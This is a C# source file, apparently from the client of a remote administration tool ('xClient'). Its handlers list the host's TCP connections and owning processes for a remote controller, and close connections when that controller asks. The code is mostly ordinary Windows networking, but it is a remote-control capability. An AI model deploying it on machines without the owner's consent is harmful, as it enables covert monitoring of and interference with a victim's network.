using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE TCP Connections COMMANDS. */

    public static partial class CommandHandler
    {
        public static void HandleGetConnections(Client client, GetConnections packet)
        {
            var table = GetTable();
            var processes = new string[table.Length];
            var localAddresses = new string[table.Length];
            var localPorts = new string[table.Length];
            var remoteAddresses = new string[table.Length];
            var remotePorts = new string[table.Length];
            var states = new byte[table.Length];

            for (var i = 0; i < table.Length; i++)
            {
                localAddresses[i] = table[i].LocalAddress.ToString();
                localPorts[i] = table[i].LocalPort.ToString();
                remoteAddresses[i] = table[i].RemoteAddress.ToString();
                remotePorts[i] = table[i].RemotePort.ToString();
                states[i] = Convert.ToByte(table[i].state);

                try
                {
                    var p = Process.GetProcessById((int) table[i].owningPid);
                    processes[i] = p.ProcessName;
                }
                catch
                {
                    processes[i] = string.Format("PID: {0}", table[i].owningPid);
                }
            }

            new GetConnectionsResponse(processes, localAddresses, localPorts, remoteAddresses, remotePorts, states)
                .Execute(client);
        }

        public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
        {
            var table = GetTable();
            var matchFound = false; // handle if connections's ports found
            for (var i = 0; i < table.Length; i++)
            {
                //search for connection by Local and Remote Ports
                if ((packet.LocalPort.ToString() == table[i].LocalPort.ToString()) &&
                    (packet.RemotePort.ToString() == table[i].RemotePort.ToString()))
                    // it will close the connection only if client run as admin
                {
                    matchFound = true;
                    //table[i].state = (byte)ConnectionStates.Delete_TCB;
                    table[i].state = 12; // 12 for Delete_TCB state
                    var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                    Marshal.StructureToPtr(table[i], ptr, false);
                    SetTcpEntry(ptr);
                }
            }
            if (matchFound)
            {
                HandleGetConnections(client, new GetConnections());
            }
        }

        public static MibTcprowOwnerPid[] GetTable()
        {
            MibTcprowOwnerPid[] tTable;
            var afInet = 2;
            var buffSize = 0;
            var ret = GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, TcpTableClass.TcpTableOwnerPidAll);
            var buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                ret = GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, TcpTableClass.TcpTableOwnerPidAll);
                if (ret != 0)
                    return null;
                var tab = (MibTcptableOwnerPid) Marshal.PtrToStructure(buffTable, typeof(MibTcptableOwnerPid));
                var rowPtr = (IntPtr) ((long) buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new MibTcprowOwnerPid[tab.dwNumEntries];
                for (var i = 0; i < tab.dwNumEntries; i++)
                {
                    var tcpRow = (MibTcprowOwnerPid) Marshal.PtrToStructure(rowPtr, typeof(MibTcprowOwnerPid));
                    tTable[i] = tcpRow;
                    rowPtr = (IntPtr) ((long) rowPtr + Marshal.SizeOf(tcpRow));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
            return tTable;
        }

        [DllImport("iphlpapi.dll", SetLastError = true)]
        private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion,
            TcpTableClass tblClass, uint reserved = 0);

        [DllImport("iphlpapi.dll")]
        private static extern int SetTcpEntry(IntPtr pTcprow);

        [StructLayout(LayoutKind.Sequential)]
        public struct MibTcprowOwnerPid
        {
            public uint state;
            public uint localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
            public uint remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
            public uint owningPid;

            public IPAddress LocalAddress
            {
                get { return new IPAddress(localAddr); }
            }

            public ushort LocalPort
            {
                get { return BitConverter.ToUInt16(new byte[2] {localPort[1], localPort[0]}, 0); }
            }

            public IPAddress RemoteAddress
            {
                get { return new IPAddress(remoteAddr); }
            }

            public ushort RemotePort
            {
                get { return BitConverter.ToUInt16(new byte[2] {remotePort[1], remotePort[0]}, 0); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MibTcptableOwnerPid
        {
            public uint dwNumEntries;
            private readonly MibTcprowOwnerPid table;
        }

        private enum TcpTableClass
        {
            TcpTableBasicListener,
            TcpTableBasicConnections,
            TcpTableBasicAll,
            TcpTableOwnerPidListener,
            TcpTableOwnerPidConnections,
            TcpTableOwnerPidAll,
            TcpTableOwnerModuleListener,
            TcpTableOwnerModuleConnections,
            TcpTableOwnerModuleAll
        }
    }
}